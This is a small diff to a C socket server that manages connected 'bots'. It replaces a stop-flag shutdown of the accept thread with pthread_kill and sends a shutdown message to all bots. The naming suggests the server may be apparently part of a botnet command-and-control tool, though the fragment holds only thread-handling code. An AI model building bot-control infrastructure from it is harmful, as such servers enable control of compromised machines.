@@ -8,7 +8,6 @@ CONNS cons;
 pthread_t accept_thread;
 int main_sock;
 struct sockaddr_in serverAddr;
-char STOPFLAG = 0;
 short port = 15551;
 
 void start()
@@ -51,8 +50,7 @@ void init()
 void close_all()
 {
 	// Stop Receiving Connections by connecting to the other thread.
-	STOPFLAG = 1;
-	pthread_join(accept_thread, NULL);
+	pthread_kill(accept_thread, SIGINT);
 	printf("[+] Accepting Closed\n");
 	struct connections *connects = &cons;
 	send_to_bots("[!SHUTDOWN!]");
